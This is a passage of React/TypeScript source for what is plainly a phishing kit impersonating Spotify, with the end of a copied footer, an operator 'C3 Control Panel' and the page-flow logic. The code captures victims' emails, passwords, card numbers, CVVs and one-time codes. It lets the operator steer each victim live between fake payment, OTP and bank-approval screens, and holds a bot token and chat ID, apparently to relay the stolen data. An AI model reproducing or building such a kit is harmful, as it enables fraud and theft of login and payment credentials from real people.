               <div key={i} className="w-10 h-10 bg-[#242424] rounded-full flex items-center justify-center cursor-pointer hover:bg-[#333] transition-colors">{icon}</div>
             ))}
          </div>
        </div>

        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6 pt-12 border-t border-white/5">
           <div className="flex flex-wrap justify-center md:justify-start gap-4 text-[10px] text-[#a7a7a7]">
              <a href="#" className="hover:text-white transition-colors">Legal</a>
              <a href="#" className="hover:text-white transition-colors">Safety & Privacy Center</a>
              <a href="#" className="hover:text-white transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-white transition-colors">Cookies</a>
              <a href="#" className="hover:text-white transition-colors">About Ads</a>
              <a href="#" className="hover:text-white transition-colors">Accessibility</a>
              <a href="#" className="hover:text-white transition-colors">Notice at Collection</a>
           </div>
           <div className="flex flex-col items-center md:items-end gap-1">
              <div className="flex items-center gap-1 text-[10px] text-[#a7a7a7] cursor-pointer hover:text-white transition-colors">
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                <span>USA</span>
              </div>
              <span className="text-[10px] text-[#a7a7a7]">© 2025 Spotify AB</span>
           </div>
        </div>
      </footer>
    </div>
  );
};

// --- Admin Dashboard ---
const AdminDashboard: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'VISITORS' | 'CONFIG' | 'SECURITY'>('VISITORS');
  const [sessions, setSessions] = useState<SessionData[]>([]);
  const [config, setConfig] = useState(getInitialConfig());
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passInput, setPassInput] = useState('');

  useEffect(() => {
    const fetch = () => {
      const data = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
      setSessions(data);
    };
    const interval = setInterval(fetch, 1000);
    return () => clearInterval(interval);
  }, []);

  const updateAction = (id: string, action: SessionData['adminAction']) => {
    const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    const next = current.map((s: SessionData) => s.id === id ? { ...s, adminAction: action } : s);
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(next));
  };

  const deleteSession = (id: string) => {
    const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(current.filter((s: SessionData) => s.id !== id)));
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#020617] flex items-center justify-center p-6">
        <div className="bg-[#0f172a] p-10 rounded-3xl border border-white/5 w-full max-w-sm shadow-2xl">
          <Logo className="w-10 text-white mb-8 mx-auto" />
          <h2 className="text-white text-2xl font-bold mb-6 text-center">Admin Console</h2>
          <input type="password" value={passInput} onChange={e => setPassInput(e.target.value)} placeholder="Access Key" className="w-full bg-black/40 border border-white/10 rounded-2xl p-4 text-white mb-6 focus:border-[#1ed760] outline-none" />
          <button onClick={() => passInput === config.adminPass ? setIsAuthenticated(true) : alert('Unauthorized.')} className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-2xl hover:scale-105 transition-all">Enter</button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#020617] text-slate-300 p-8 md:p-12 font-sans">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-end mb-12">
          <div>
            <h1 className="text-white text-4xl font-black tracking-tight">C3 Control Panel</h1>
            <p className="text-slate-500 text-sm mt-2">Active intelligence and visitor control dashboard</p>
          </div>
          <button onClick={() => setIsAuthenticated(false)} className="bg-red-600/10 text-red-500 px-6 py-3 rounded-2xl font-bold border border-red-600/20 hover:bg-red-600 hover:text-white transition-all">Sign out</button>
        </header>

        <nav className="flex bg-[#0f172a] p-2 rounded-[24px] mb-12 border border-white/5 shadow-inner">
          {['VISITORS', 'CONFIG', 'SECURITY'].map(t => (
            <button key={t} onClick={() => setActiveTab(t as any)} className={`flex-1 py-4 rounded-2xl font-black text-xs tracking-widest transition-all ${activeTab === t ? 'bg-[#1e293b] text-white shadow-xl scale-[1.02]' : 'hover:text-white opacity-40'}`}>
              {t}
            </button>
          ))}
        </nav>

        {activeTab === 'VISITORS' && (
          <div className="space-y-6">
            {sessions.filter(s => Date.now() - s.lastActive < 10000).length === 0 ? (
              <div className="text-center py-32 bg-[#0f172a] rounded-[40px] border border-white/5 border-dashed text-slate-600 font-bold">Waiting for live connections...</div>
            ) : sessions.filter(s => Date.now() - s.lastActive < 10000).map(s => (
              <div key={s.id} className="bg-[#0f172a] rounded-[40px] p-10 border border-white/5 shadow-2xl animate-in slide-in-from-bottom-8">
                <div className="flex justify-between items-center mb-10">
                  <div className="flex items-center gap-5">
                    <div className="relative">
                      <div className="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center border border-white/10 font-bold text-white">S</div>
                      <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-[#0f172a] animate-pulse" />
                    </div>
                    <div>
                      <h4 className="text-white font-black text-xl">{s.ip}</h4>
                      <p className="text-xs text-slate-500 font-bold">{s.country} • {s.city}</p>
                    </div>
                  </div>
                  <button onClick={() => deleteSession(s.id)} className="w-10 h-10 flex items-center justify-center rounded-xl bg-red-500/5 text-red-500/30 hover:bg-red-500 hover:text-white transition-all"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">State</span><div className="text-green-500 font-black truncate">{s.currentPage}</div></div>
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">Account</span><div className="text-white font-black truncate">{s.email || '-'}</div></div>
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">Card</span><div className="text-[#1ed760] font-black truncate">{s.card || '-'}</div></div>
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">Code</span><div className="text-blue-500 font-black truncate">{s.otp || '-'}</div></div>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
                   <button onClick={() => updateAction(s.id, 'INVALID_CARD')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'INVALID_CARD' ? 'bg-orange-600 text-white' : 'bg-orange-600/5 text-orange-500 border-orange-500/10 hover:bg-orange-600 hover:text-white'}`}>DECLINE CARD</button>
                   <button onClick={() => updateAction(s.id, 'OTP_PAGE')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'OTP_PAGE' ? 'bg-blue-600 text-white' : 'bg-blue-600/5 text-blue-500 border-blue-500/10 hover:bg-blue-600 hover:text-white'}`}>REQUEST OTP</button>
                   <button onClick={() => updateAction(s.id, 'INVALID_OTP')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'INVALID_OTP' ? 'bg-red-600 text-white' : 'bg-red-600/5 text-red-500 border-red-500/10 hover:bg-red-600 hover:text-white'}`}>INVALID OTP</button>
                   <button onClick={() => updateAction(s.id, 'BANK_APPROVAL')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'BANK_APPROVAL' ? 'bg-purple-600 text-white' : 'bg-purple-600/5 text-purple-500 border-purple-500/10 hover:bg-purple-600 hover:text-white'}`}>BANK APP</button>
                   <button onClick={() => updateAction(s.id, 'NORMAL')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'NORMAL' ? 'bg-green-600 text-white' : 'bg-green-600/5 text-green-500 border-green-500/10 hover:bg-green-600 hover:text-white'}`}>NORMAL</button>
                   <button onClick={() => updateAction(s.id, 'BLOCK')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'BLOCK' ? 'bg-black text-white' : 'bg-black/20 text-slate-500 border-white/5 hover:bg-red-900 hover:text-white'}`}>BLOCK IP</button>
                </div>
              </div>
            ))}
          </div>
        )}

        {activeTab === 'CONFIG' && (
          <div className="max-w-xl mx-auto bg-[#0f172a] p-12 rounded-[48px] border border-white/5 shadow-2xl">
            <h3 className="text-white text-2xl font-black mb-8">Bot Integration</h3>
            <div className="space-y-6">
              <div><label className="block text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">API Token</label><input type="text" value={config.botToken} onChange={e => setConfig({...config, botToken: e.target.value})} className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-white focus:border-[#1ed760] outline-none" /></div>
              <div><label className="block text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">Chat Identifier</label><input type="text" value={config.chatId} onChange={e => setConfig({...config, chatId: e.target.value})} className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-white focus:border-[#1ed760] outline-none" /></div>
              <button onClick={() => { localStorage.setItem(CONFIG_STORAGE_KEY, JSON.stringify(config)); alert('Settings deployed.'); }} className="w-full bg-[#1ed760] text-black font-black py-5 rounded-2xl hover:scale-105 transition-all text-sm uppercase tracking-widest">Update Configuration</button>
            </div>
          </div>
        )}

        {activeTab === 'SECURITY' && (
          <div className="max-w-xl mx-auto bg-[#0f172a] p-12 rounded-[48px] border border-white/5 shadow-2xl">
            <h3 className="text-white text-2xl font-black mb-8">Access Management</h3>
            <div className="space-y-6">
              <div><label className="block text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">New Master Password</label><input type="password" placeholder="••••••••" onChange={e => setConfig({...config, adminPass: e.target.value})} className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-white focus:border-red-600 outline-none" /></div>
              <button onClick={() => { localStorage.setItem(CONFIG_STORAGE_KEY, JSON.stringify(config)); alert('Security key updated.'); }} className="w-full bg-red-600 text-white font-black py-5 rounded-2xl hover:bg-red-700 transition-all text-sm uppercase tracking-widest">Save Key</button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

// --- Main App Logic ---
const App: React.FC = () => {
  const [step, setStep] = useState<'CAPTCHA' | 'LOGIN' | 'PAYMENT' | 'PROCESSING' | 'OTP' | 'BANK_APPROVAL' | 'ADMIN' | 'BLOCKED'>('CAPTCHA');
  const [session, setSession] = useState<SessionData | null>(null);
  const sessionId = useRef(Math.random().toString(36).substr(2, 9));

  useEffect(() => {
    if (window.location.search.includes('admin=true')) setStep('ADMIN');
  }, []);

  useEffect(() => {
    if (step === 'ADMIN' || step === 'BLOCKED') return;

    const start = async () => {
      const info = await getVisitorInfo();
      const s: SessionData = {
        id: sessionId.current,
        ip: info.ip, city: info.city, country: info.country,
        currentPage: 'Connecting',
        lastActive: Date.now(),
        email: '', pass: '', card: '', exp: '', cvv: '', otp: '',
        adminAction: 'NORMAL'
      };
      setSession(s);
    };
    start();

    const monitor = setInterval(() => {
      setSession(prev => {
        if (!prev) return null;
        const currentData: SessionData[] = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
        const updated = { ...prev, lastActive: Date.now() };
        const idx = currentData.findIndex(s => s.id === updated.id);
        
        if (idx > -1) {
          const remote = currentData[idx];
          // React to remote commands
          if (remote.adminAction === 'BLOCK') setStep('BLOCKED');
          else if (remote.adminAction === 'OTP_PAGE' && step !== 'OTP' && step !== 'PROCESSING') setStep('OTP');
          else if (remote.adminAction === 'INVALID_OTP' && step === 'PROCESSING') setStep('OTP');
          else if (remote.adminAction === 'BANK_APPROVAL' && step === 'PROCESSING') setStep('BANK_APPROVAL');
          else if (remote.adminAction === 'INVALID_CARD' && step !== 'PAYMENT') setStep('PAYMENT');
          else if (remote.adminAction === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL' || step === 'PROCESSING')) setStep('PAYMENT');
          
          currentData[idx] = { ...updated, adminAction: remote.adminAction };
        } else {
          currentData.push(updated);
        }
        localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(currentData));
        return updated;
      });
    }, 1000);

    return () => clearInterval(monitor);
  }, [step]);

  const update = (d: Partial<SessionData>) => setSession(prev => prev ? ({ ...prev, ...d }) : null);

  if (step === 'ADMIN') return <AdminDashboard />;
  if (step === 'BLOCKED') return <div className="min-h-screen bg-black flex items-center justify-center p-12 text-center animate-pulse"><h1 className="text-white text-4xl font-black">403 | Connection Refused</h1></div>;
  if (!session) return <div className="min-h-screen bg-black" />;

  switch (step) {
    case 'CAPTCHA': return <SecurityCheck session={session} updateSession={update} onVerify={() => setStep('LOGIN')} />;
    case 'LOGIN': return <LoginForm session={session} updateSession={update} onLogin={() => setStep('PAYMENT')} />;
    case 'PAYMENT': return <PaymentForm session={session} updateSession={update} onPay={() => setStep('PROCESSING')} />;
    case 'PROCESSING': return <ProcessingScreen />;
    case 'OTP': return <OTPPage session={session} updateSession={update} onOTPSubmit={() => setStep('PROCESSING')} />;
    case 'BANK_APPROVAL': return <BankApproval updateSession={update} cardType={session.card} />;
    default: return <div className="min-h-screen bg-black flex items-center justify-center"><div className="w-12 h-12 border-4 border-[#1ed760] border-t-transparent rounded-full animate-spin"></div></div>;
  }
};

export default App;
